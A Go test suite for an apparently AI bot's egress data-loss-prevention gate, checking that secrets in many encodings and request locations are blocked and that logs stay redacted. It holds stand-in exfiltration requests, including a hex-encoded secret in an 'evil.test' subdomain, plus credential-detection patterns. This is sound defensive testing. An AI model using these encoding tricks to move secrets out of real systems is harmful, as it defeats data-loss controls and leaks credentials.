package netx

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"maps"
	"math/rand/v2"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/damnbot/damnbot/internal/netx/retry"
	"github.com/damnbot/damnbot/internal/testutil/timing"
)

// reservedValue holds every URL/HTML/JSON-reserved byte class (NETX-5).
const reservedValue = `a/b+c=d&e<f>"g h%i?j#k`

// pctAll percent-encodes every byte; lower selects lowercase hex.
func pctAll(s string, lower bool) string {
	var b strings.Builder
	for _, c := range []byte(s) {
		h := fmt.Sprintf("%%%02X", c)
		if lower {
			h = strings.ToLower(h)
		}
		b.WriteString(h)
	}
	return b.String()
}

// encodings are the transformations the gate must see through; each maps
// the secret to a string a server would decode back to it.
func encodings() map[string]func(string) string {
	return map[string]func(string) string{
		"raw":           func(s string) string { return s },
		"pct-canonical": url.QueryEscape,
		"pct-path":      url.PathEscape,
		"pct-all":       func(s string) string { return pctAll(s, false) },
		"pct-lower":     func(s string) string { return pctAll(s, true) },
		"pct-double":    func(s string) string { return url.QueryEscape(url.QueryEscape(s)) },
		"pct-triple":    func(s string) string { return url.QueryEscape(url.QueryEscape(url.QueryEscape(s))) },
		"base64":        func(s string) string { return base64.StdEncoding.EncodeToString([]byte("x:" + s + ";")) },
		"base64url":     func(s string) string { return base64.URLEncoding.EncodeToString([]byte("ab" + s)) },
		"base64-mime": func(s string) string {
			e := base64.StdEncoding.EncodeToString([]byte(strings.Repeat("pad", 20) + s))
			return e[:40] + "\r\n" + e[40:]
		},
		"hex":       func(s string) string { return hex.EncodeToString([]byte(s)) },
		"hex-upper": func(s string) string { return strings.ToUpper(hex.EncodeToString([]byte(s))) },
		"hex-mixed": func(s string) string {
			h := []byte(hex.EncodeToString([]byte(s)))
			for i := 0; i < len(h); i += 2 {
				h[i] = strings.ToUpper(string(h[i]))[0]
			}
			return string(h)
		},
		"json": func(s string) string {
			b, err := json.Marshal(map[string]string{"k": s})
			if err != nil {
				return "<marshal error>"
			}
			return string(b)
		},
	}
}

// locations put an encoded value somewhere a request carries it; ok=false
// when the encoding cannot appear there verbatim (e.g. CR/LF in a header).
func locations(base string) map[string]func(enc string) (*http.Request, bool) {
	mk := func(method, u, body string, hdr http.Header) (*http.Request, bool) {
		var r io.Reader
		if body != "" {
			r = strings.NewReader(body)
		}
		req, err := http.NewRequest(method, u, r) //nolint:noctx // never sent
		if err != nil {
			return nil, false
		}
		maps.Copy(req.Header, hdr)
		return req, true
	}
	return map[string]func(string) (*http.Request, bool){
		"query": func(e string) (*http.Request, bool) { return mk(http.MethodGet, base+"/s?q="+e, "", nil) },
		"path":  func(e string) (*http.Request, bool) { return mk(http.MethodGet, base+"/p/"+e, "", nil) },
		"form-body": func(e string) (*http.Request, bool) {
			return mk(http.MethodPost, base, "a=1&note="+e, http.Header{"Content-Type": {"application/x-www-form-urlencoded"}})
		},
		"json-body": func(e string) (*http.Request, bool) { return mk(http.MethodPost, base, `{"text":"`+e+`"}`, nil) },
		"header": func(e string) (*http.Request, bool) {
			if strings.ContainsAny(e, "\r\n") {
				return nil, false
			}
			return mk(http.MethodGet, base, "", http.Header{"X-Trace": {e}})
		},
	}
}

// TestEgressDLP (GAP-SEC-16, NETX-2/5): a secret with reserved bytes in
// every location × encoding (incl. non-canonical percent-encoding) is
// blocked before a byte is sent; the request bytes never echo it.
func TestEgressDLP(t *testing.T) {
	t.Parallel()
	srv, conns := server(t, func(w http.ResponseWriter, _ *http.Request) { write(w, "ok") })
	vault := []string{reservedValue, "s3cr3t-Vault-Value-9f8e7d6c"}
	n := newNet(t, Config{Secrets: vault})
	fetch := n.Client("web_fetch", Tool)
	for _, sec := range vault {
		for ln, loc := range locations(srv.URL) {
			for en, enc := range encodings() {
				req, ok := loc(enc(sec))
				if !ok {
					continue
				}
				t.Run(fmt.Sprintf("web_fetch/%s/%s/%d", ln, en, len(sec)), func(t *testing.T) {
					wantBlocked(t, fetch, req, sec, srv.Listener.Addr().String())
				})
			}
		}
	}
	for _, u := range []string{srv.URL + "/?k=ghp_" + strings.Repeat("a", 36), "http://" + hex.EncodeToString([]byte(vault[1])) + ".evil.test/"} {
		resp, err := fetch.Do(toolReq(t, http.MethodGet, u, "", nil))
		closeBody(t, resp)
		if !errors.Is(err, ErrSecretEgress) {
			t.Errorf("%s: %v", u, err)
		}
	}
	if conns.Load() != 0 {
		t.Fatalf("%d connections opened for blocked requests", conns.Load())
	}
	resp, err := fetch.DoOK(toolReq(t, http.MethodPost, srv.URL+"/search?q=go+generics%20%2Bplus", `{"q":"hello & <b>"}`, nil))
	if err != nil {
		t.Fatalf("clean request: %v", err)
	}
	if err := resp.Body.Close(); err != nil {
		t.Fatal(err)
	}
}

// wantBlocked asserts req is refused as secret_egress without echoing the
// secret or the target address.
func wantBlocked(t *testing.T, c *Client, req *http.Request, secret, addr string) {
	t.Helper()
	resp, err := c.Do(req.WithContext(t.Context()))
	closeBody(t, resp)
	if !errors.Is(err, ErrSecretEgress) || retry.ClassifyErr(err) != retry.BadRequest {
		t.Fatalf("not blocked: %v", err)
	}
	if strings.Contains(err.Error(), secret) || strings.Contains(err.Error(), addr) {
		t.Errorf("error echoes the request: %v", err)
	}
}

func toolReq(t *testing.T, method, rawURL, body string, hdr map[string]string) *http.Request {
	t.Helper()
	var r io.Reader
	if body != "" {
		r = strings.NewReader(body)
	}
	req, err := http.NewRequestWithContext(t.Context(), method, rawURL, r)
	if err != nil {
		t.Fatal(err)
	}
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	return req
}

// TestDLPWire (NETX-6/7/10/11): Host and trailers are scanned; the body
// is read once and the scanned bytes are sent; an oversized body, a zero
// purpose, and secrets added later are handled fail-closed.
func TestDLPWire(t *testing.T) {
	t.Parallel()
	var got []byte
	srv, _ := server(t, func(_ http.ResponseWriter, r *http.Request) { got, _ = io.ReadAll(r.Body) }) //nolint:errcheck // asserted below
	n := newNet(t, Config{Secrets: []string{"0123456789abcdef"}})
	fetch := n.Client("web_fetch", Tool)
	hostReq := toolReq(t, http.MethodGet, srv.URL, "", nil)
	hostReq.Host = "0123456789abcdef.example"
	trailerReq := toolReq(t, http.MethodPost, srv.URL, "x", nil)
	trailerReq.Trailer = http.Header{"X-T": {"0123456789ABCDEF"}}
	big := toolReq(t, http.MethodPost, srv.URL, "", nil)
	big.Body = io.NopCloser(io.LimitReader(zeros{}, dlpMaxBody+1))
	for name, c := range map[string]struct {
		req  *http.Request
		want error
	}{"host": {hostReq, ErrSecretEgress}, "trailer": {trailerReq, ErrSecretEgress}, "big": {big, ErrDLPLimit}} {
		resp, err := fetch.Do(c.req)
		closeBody(t, resp)
		if !errors.Is(err, c.want) {
			t.Errorf("%s: %v", name, err)
		}
	}
	once := toolReq(t, http.MethodPost, srv.URL, "", nil)
	once.Body, once.GetBody = io.NopCloser(strings.NewReader("payload")), nil // not rewindable
	resp, err := fetch.DoOK(once)
	if err != nil || string(got) != "payload" {
		t.Fatalf("scanned body not sent: %q %v", got, err)
	}
	closeBody2(t, resp)
	resp, err = n.Client("x", 0).Do(toolReq(t, http.MethodGet, srv.URL, "", nil))
	closeBody(t, resp)
	if !errors.Is(err, ErrPurpose) {
		t.Errorf("zero purpose: %v", err)
	}
	n.SetSecrets([]string{"rotated-token-value"})
	resp, err = fetch.Do(toolReq(t, http.MethodGet, srv.URL+"/?t=rotated-token-value", "", nil))
	closeBody(t, resp)
	if !errors.Is(err, ErrSecretEgress) {
		t.Errorf("rotated secret: %v", err)
	}
}

type zeros struct{}

func (zeros) Read(p []byte) (int, error) { clear(p); return len(p), nil }

func closeBody2(t *testing.T, resp *http.Response) {
	t.Helper()
	if err := resp.Body.Close(); err != nil {
		t.Error(err)
	}
}

func TestSecretForms(t *testing.T) {
	t.Parallel()
	d := newDLP([]string{"s3cr3t-Vault-Value", "ab"})
	for pre := range 5 {
		blob := strings.Repeat("z", pre) + "s3cr3t-Vault-Value" + "tail"
		for _, enc := range []*base64.Encoding{base64.StdEncoding, base64.URLEncoding, base64.RawStdEncoding} {
			if err := d.scan([]byte(enc.EncodeToString([]byte(blob)))); !errors.Is(err, ErrSecretEgress) {
				t.Errorf("base64 at offset %d (%v) not found", pre, enc)
			}
		}
	}
	if err := d.scan([]byte("x ab y")); !errors.Is(err, ErrSecretEgress) {
		t.Errorf("short raw secret not found: %v", err)
	}
	if err := d.scan([]byte("YWI=")); err != nil { // base64("ab"): too short to match encoded
		t.Errorf("short secret matched in base64 form: %v", err)
	}
	if got := alignedBase64(base64.StdEncoding, "abc", 2); got != "" {
		t.Errorf("no full group expected, got %q", got)
	}
	if got := string(pctDecode(nil, []byte("%2f%2F+%zz%4"))); got != "// %zz%4" {
		t.Errorf("pctDecode = %q", got)
	}
}

// dlpBody8K returns an 8 KiB request body without secrets:
//   - plain: prose + an embedded hex dump;
//   - pct: realistic web_fetch form traffic — '+' spaces, %20/%2F escapes,
//     a double-encoded redirect_uri (%2520), "C++", "50%25";
//   - prefix (adversarial): every 8-byte window collides with the shared
//     prefix of the secret forms (maximal verification work);
//   - decode (adversarial): every byte is part of a triple-encoded escape.
func dlpBody8K(kind string) []byte {
	var unit string
	switch kind {
	case "decode":
		unit = "%252525+\r\nAa"
	case "prefix":
		unit = hex.EncodeToString([]byte("tok_prefix"))[:8]
	case "pct":
		// A form-encoded prose body ('+' spaces, a few single escapes) and
		// one double-encoded redirect_uri, as in NETX-15/16.
		form := strings.ReplaceAll("the quick brown fox jumps over the lazy dog, C++ is 50% faster; ", " ", "+")
		form = strings.NewReplacer(",", "%2C", "%", "%25", ";", "%3B").Replace(form)
		body := "redirect_uri=" + url.QueryEscape(url.QueryEscape("https://app.example/cb?x=1&y=two words")) + "&text="
		return []byte((body + strings.Repeat(form, 8<<10/len(form)+1))[:8<<10])
	default:
		unit = "The quick brown fox jumps over the lazy dog; " + hex.EncodeToString([]byte("0123456789"))
	}
	return bytes.Repeat([]byte(unit), 8<<10/len(unit)+1)[:8<<10]
}

// dlpSecrets returns n distinct secrets sharing a prefix (worst case for
// the prefix index).
func dlpSecrets(n int) []string {
	out := make([]string, n)
	for i := range out {
		out[i] = fmt.Sprintf("tok_prefix_%04d_%s", i, strings.Repeat("Q", 24))
	}
	return out
}

// dlpShortSecrets returns n short (4–7 byte) vault values that never occur
// in the corpus bodies.
func dlpShortSecrets(n int) []string {
	out := make([]string, n)
	for i := range out {
		out[i] = fmt.Sprintf("~%c%c%c%s", 'J'+i%10, 'V'+i/10%4, 'W'+i/40, strings.Repeat("#", i%4))
	}
	return out
}

// dlpBudgetMinRuns is the iteration count from which BenchmarkDLPScan
// asserts its budget (make perf runs 100).
const dlpBudgetMinRuns = 100

// dlpBudget is GAP-SEC-16's ≤ 50 µs per 8 KiB request for realistic
// bodies; adversarial ones are only bounded by (1+dlpMaxDepth)·len work.
func dlpBudget(kind string) time.Duration {
	if kind == "prefix" || kind == "decode" {
		return 200 * time.Microsecond
	}
	return 50 * time.Microsecond
}

// BenchmarkDLPScan (GAP-SEC-16, NETX-3/13/16): gate cost for an 8 KiB
// request with 50 and 200 long secrets or 50 short ones, over realistic
// and adversarial bodies. The budget is asserted in `make perf` (×1.5 on
// shared runners, ADR-077).
func BenchmarkDLPScan(b *testing.B) {
	sets := map[string][]string{"long50": dlpSecrets(50), "long200": dlpSecrets(200), "short50": dlpShortSecrets(50)}
	for _, set := range []string{"long50", "long200", "short50"} {
		for _, kind := range []string{"plain", "pct", "prefix", "decode"} {
			b.Run(set+"/"+kind, func(b *testing.B) {
				d := newDLP(sets[set])
				body := dlpBody8K(kind)
				b.SetBytes(int64(len(body)))
				b.ReportAllocs()
				for b.Loop() {
					if err := d.scan(body); err != nil && !errors.Is(err, ErrDLPLimit) {
						b.Fatal(err)
					}
				}
				// make test-timing runs every benchmark once (-benchtime=1x): a
				// cold single scan measures warm-up, not the gate; the budget is
				// asserted by make perf (-benchtime=100x).
				if b.N >= dlpBudgetMinRuns {
					timing.Check(b, fmt.Sprintf("DLP scan 8 KiB, %s secrets, %s body (GAP-SEC-16)", set, kind), b.Elapsed()/time.Duration(b.N), dlpBudget(kind))
				}
			})
		}
	}
}

// TestDLPBounds (NETX-3/15): legitimate inputs are never refused for
// work — encoded traffic of any size passes — and only prefix-collision
// floods fail closed; secrets stay blocked through every layer.
func TestDLPBounds(t *testing.T) {
	t.Parallel()
	d := newDLP(dlpSecrets(50))
	for kind, want := range map[string]error{"plain": nil, "pct": nil, "decode": nil, "prefix": ErrDLPLimit} {
		if err := d.scan(dlpBody8K(kind)); !errors.Is(err, want) || (want == nil) != (err == nil) {
			t.Errorf("%s: %v, want %v", kind, err, want)
		}
	}
	sec := dlpSecrets(1)[0]
	prose := strings.Repeat("plain prose with C++ and 50%25 off ", 2000) // 70 KiB
	for _, size := range []int{512, 1500, 2048, 8 << 10, 64 << 10} {
		body := []byte(prose[:size] + "&next=" + url.QueryEscape(url.QueryEscape("https://app.example/cb?x=1")))
		if err := d.scan(body); err != nil {
			t.Errorf("%d B body with a double-encoded redirect_uri: %v", size, err)
		}
		for _, enc := range []string{url.QueryEscape(url.QueryEscape(sec)), url.QueryEscape(url.QueryEscape(url.QueryEscape(sec))), pctAll(sec, true)} {
			if err := d.scan([]byte(prose[:size] + "&leak=" + enc)); !errors.Is(err, ErrSecretEgress) {
				t.Errorf("%d B body, encoded secret %.20q…: %v", size, enc, err)
			}
		}
	}
	// A §14.3 pattern visible only after decoding, inside a large body.
	if err := d.scan([]byte(prose[:8<<10] + "&t=" + pctAll("ghp_"+strings.Repeat("a", 36), false))); !errors.Is(err, ErrSecretEgress) {
		t.Errorf("percent-encoded token pattern: %v", err)
	}
	short := newDLP(dlpShortSecrets(50))
	if err := short.scan([]byte(prose[:2048] + url.QueryEscape(dlpShortSecrets(50)[17]))); !errors.Is(err, ErrSecretEgress) {
		t.Errorf("short secret: %v", err)
	}
	if err := short.scan(dlpBody8K("pct")); err != nil {
		t.Errorf("short secrets on clean pct body: %v", err)
	}
}

// TestLogMetadataOnly (ADR-071 butir 5, SPEC §15, NETX-4): DEBUG request
// lines carry metadata only, a redacted host/path, and nothing of a
// blocked request's URL.
func TestLogMetadataOnly(t *testing.T) {
	t.Parallel()
	var buf bytes.Buffer
	log := slog.New(slog.NewJSONHandler(&buf, &slog.HandlerOptions{Level: slog.LevelDebug}))
	srv, _ := server(t, func(w http.ResponseWriter, _ *http.Request) { write(w, "RESPONSE-BODY") })
	const vaultSecret = "s3cr3t-Vault-Value-9f8e7d6c"
	n := newNet(t, Config{Secrets: []string{vaultSecret}, Log: log})
	tok := "123456789:" + strings.Repeat("A", 35) // Telegram bot token pattern
	resp, err := n.Client("telegram", Inference).DoOK(toolReq(t, http.MethodPost,
		srv.URL+"/bot"+tok+"/sendMessage?chat_id=QUERY-VALUE", "REQUEST-BODY", map[string]string{"X-H": "HEADER-VALUE"}))
	if err != nil {
		t.Fatal(err)
	}
	closeBody2(t, resp)
	host := hex.EncodeToString([]byte(vaultSecret)) + ".evil.test"
	resp, err = n.Client("web_fetch", Tool).Do(toolReq(t, http.MethodGet, "http://"+host+"/?q=x", "", nil))
	closeBody(t, resp)
	if !errors.Is(err, ErrSecretEgress) || strings.Contains(err.Error(), host) {
		t.Fatal(err)
	}
	out := buf.String()
	for _, leak := range []string{tok, "QUERY-VALUE", "REQUEST-BODY", "HEADER-VALUE", "RESPONSE-BODY", vaultSecret, host} {
		if strings.Contains(out, leak) {
			t.Errorf("log leaks %q:\n%s", leak, out)
		}
	}
	for _, want := range []string{`"egress":"telegram"`, `"status":200`, `"req_bytes":12`, `"class":"bad_request"`, "REDACTED", `"host":"[blocked]"`} {
		if !strings.Contains(out, want) {
			t.Errorf("log lacks %s:\n%s", want, out)
		}
	}
}

// TestShortSecretOffsets: stride probing finds every short secret (2–7
// bytes, mixed lengths) at every offset, alone and next to longer ones.
func TestShortSecretOffsets(t *testing.T) {
	t.Parallel()
	for minLen := 2; minLen <= 7; minLen++ {
		secrets := []string{strings.Repeat("Z", 7)[:minLen-1] + "q", "~short7", "tok_prefix_long_value"}
		d := newDLP(secrets)
		for _, sec := range secrets {
			for off := range 24 {
				body := []byte(strings.Repeat(".", off) + sec + strings.Repeat(".", 24-off))
				if err := d.scan(body); !errors.Is(err, ErrSecretEgress) {
					t.Errorf("min %d: %q at offset %d: %v", minLen, sec, off, err)
				}
			}
		}
		if err := d.scan([]byte(strings.Repeat(".", 64))); err != nil {
			t.Errorf("min %d: clean body: %v", minLen, err)
		}
	}
}

// TestDLPLongContext (NETX-26): a decoded byte far (> d.region) from the
// rest of a match is still caught — patterns with unbounded context (jwt,
// url_password) run over the whole decoded layer, and the secret window is
// counted in folded bytes (CR/LF dropped by fold do not count).
func TestDLPLongContext(t *testing.T) {
	t.Parallel()
	secret := "secret_tok_value_0123456789abcdef" // 33 B
	d := newDLP([]string{secret})
	b64 := func(n int) string { return strings.Repeat("A", n) }
	for _, pad := range []int{200, 255, 256, 257, 260, 300, 1000, 5000} {
		cases := map[string]string{
			"jwt":          "GET /?t=eyJhbGciOiJIUzI1NiJ9." + b64(pad) + "%2E" + b64(43),
			"jwt-dot-head": "t=eyJhbGciOiJIUzI1NiJ9%2E" + b64(pad) + "." + b64(43),
			"url_password": "u=postgres://admin:hunter2" + strings.Repeat("x", pad) + "%40db.internal/app",
			"secret-lf":    "%73ec" + strings.Repeat("\n", pad) + secret[3:],
			"secret-crlf":  secret[:10] + strings.Repeat("\r\n", pad) + "%" + fmt.Sprintf("%02X", secret[10]) + secret[11:],
			"secret-tail":  secret[:30] + strings.Repeat("\n", pad) + "%" + fmt.Sprintf("%02x", secret[30]) + secret[31:],
		}
		for name, body := range cases {
			if err := d.scan([]byte(body)); !errors.Is(err, ErrSecretEgress) {
				t.Errorf("%s pad %d: %v", name, pad, err)
			}
		}
	}
	// Benign long context stays clean.
	if err := d.scan([]byte("u=https://example.com/" + strings.Repeat("x", 5000) + "%40v1&q=" + strings.Repeat("%20a\n", 300))); err != nil {
		t.Errorf("benign long context: %v", err)
	}
}

// TestDLPCandidateMemory (NETX-28): a body of undecodable '%' bytes keeps
// the candidate list bounded and still scans (no secret, no error).
//
//nolint:paralleltest // measures process-wide TotalAlloc
func TestDLPCandidateMemory(t *testing.T) {
	d := newDLP(dlpSecrets(5))
	body := bytes.Repeat([]byte("%"), dlpMaxBody)
	var ms runtime.MemStats
	runtime.ReadMemStats(&ms)
	before := ms.TotalAlloc
	if err := d.scan(body); err != nil {
		t.Fatal(err)
	}
	runtime.ReadMemStats(&ms)
	if grew := ms.TotalAlloc - before; grew > 8*dlpMaxBody { // race mode drops pooled buffers
		t.Fatalf("8 MiB of %% allocated %d MiB", grew>>20)
	}
}

// TestDLPShortSecretsProse (NETX-27): 50 short secrets sharing a frequent
// 2-byte key do not exhaust the verify budget on 72 KiB of benign prose
// (≈ 260 KiB of short comparisons, over the old shared dlpMaxVerify).
func TestDLPShortSecretsProse(t *testing.T) {
	t.Parallel()
	var secrets []string
	for i := range 50 {
		secrets = append(secrets, fmt.Sprintf("e %03d!", i)) // key "e " ends many words
	}
	d := newDLP(secrets)
	prose := []byte(strings.Repeat("the interesting store on the corner has some cheap bread and milk; ", 1100))
	if err := d.scan(prose); err != nil {
		t.Fatalf("benign prose: %v", err)
	}
}

// patternRef is the whole-layer reference for the §14.3 patterns: every
// decoding layer scanned in full (main's behaviour before NETX-15/16).
func patternRef(d *dlp, b []byte) bool {
	layer := b
	for depth := 0; ; depth++ {
		if d.patternHit(layer) {
			return true
		}
		if depth == dlpMaxDepth || bytes.IndexByte(layer, '%') < 0 && bytes.IndexByte(layer, '+') < 0 {
			return false
		}
		layer = pctDecode(nil, layer)
	}
}

func dlpPieces() []string {
	return []string{
		"eyJ", "abcdefgh", "ABCDEFGHIJ", ".", "%2E", "%2e", "%252E", "://", "%3A%2F%2F", ":", "%3A", "@", "%40", "%2540",
		"admin", "+", " ", "\n", "\r\n", "%20", "%0A", "sk-", "%73k-", "ghp_", "%67hp_", strings.Repeat("A", 36), "12345678",
		"%25", "x", "-", "_", "Authorization: Bearer ", "%41uthorization%3A+Bearer+", "-----BEGIN RSA PRIVATE KEY-----",
		"%2D----BEGIN+RSA+PRIVATE+KEY-----", "postgres", "\"", "'", "github_pat_", "AKIA", "%41KIA", "0123456789ABCDEF",
	}
}

// TestDLPPatternDifferential (NETX-26): scanning patterns only in the
// decoded runs gives the same verdict as scanning every layer in full.
func TestDLPPatternDifferential(t *testing.T) {
	t.Parallel()
	d := newDLP(nil)
	pieces := dlpPieces()
	rng := rand.New(rand.NewPCG(26, 26)) //nolint:gosec // G404: deterministic test data, not secrets
	var b strings.Builder
	for i := range 20_000 {
		b.Reset()
		for range 1 + rng.IntN(40) {
			b.WriteString(pieces[rng.IntN(len(pieces))])
			if rng.IntN(8) == 0 {
				b.WriteString(strings.Repeat("y", rng.IntN(300)))
			}
		}
		in := []byte(b.String())
		want := patternRef(d, in)
		got := errors.Is(d.scan(in), ErrSecretEgress)
		if got != want {
			t.Fatalf("case %d %q: scan=%v reference=%v", i, in, got, want)
		}
	}
}

// FuzzDLPPatterns: the same differential over fuzzed bodies.
func FuzzDLPPatterns(f *testing.F) {
	for _, p := range dlpPieces() {
		f.Add([]byte("t=" + p + strings.Repeat("z", 260) + "%2E" + p))
	}
	d := newDLP(nil)
	f.Fuzz(func(t *testing.T, in []byte) {
		if len(in) > 1<<16 {
			return
		}
		if got, want := errors.Is(d.scan(in), ErrSecretEgress), patternRef(d, in); got != want {
			t.Fatalf("%q: scan=%v reference=%v", in, got, want)
		}
	})
}

// fullRef is the whole-layer reference for patterns and secrets: every
// decoding layer folded and matched in full, with no verify bound.
func fullRef(d *dlp, b []byte) bool {
	layer := b
	for depth := 0; ; depth++ {
		budget := verifyBudget{long: 1 << 40, short: 1 << 40}
		if d.patternHit(layer) {
			return true
		}
		if found, _ := d.match(d.fold(nil, layer), &budget); found { //nolint:errcheck // unbounded budget
			return true
		}
		if depth == dlpMaxDepth || bytes.IndexByte(layer, '%') < 0 && bytes.IndexByte(layer, '+') < 0 {
			return false
		}
		layer = pctDecode(nil, layer)
	}
}

// TestDLPSecretDifferential (NETX-26/31): windows only around decoded bytes
// that can belong to a secret form give the verdict of full-layer scans.
func TestDLPSecretDifferential(t *testing.T) {
	t.Parallel()
	vault := strings.Join([]string{"Vault", "-Tok3n_value+x/y z"}, "")
	d := newDLP([]string{vault, "q~7"})
	var pieces []string
	for _, enc := range encodings() {
		e := enc(vault)
		pieces = append(pieces, e[:len(e)/2], e[len(e)/2:], e)
	}
	pieces = append(pieces, "Vault", "-Tok", "%2D", "%2d", "3n_", "value", "%2B", "+", "x/", "%2F", "y", " ", "%20", "z",
		"\n", "%0A", "\r\n", "%0D%0A", "q", "~", "%7E", "7", "%25", "%", "a", ",", "%2C", ";", "%3B", "%2520")
	rng := rand.New(rand.NewPCG(31, 31)) //nolint:gosec // G404: deterministic test data, not secrets
	var b strings.Builder
	for i := range 30_000 {
		b.Reset()
		for range 1 + rng.IntN(30) {
			b.WriteString(pieces[rng.IntN(len(pieces))])
			if rng.IntN(10) == 0 {
				b.WriteString(strings.Repeat("y", rng.IntN(80)))
			}
		}
		in := []byte(b.String())
		want := fullRef(d, in)
		got := errors.Is(d.scan(in), ErrSecretEgress)
		if got != want {
			t.Fatalf("case %d %q: scan=%v reference=%v", i, in, got, want)
		}
	}
}
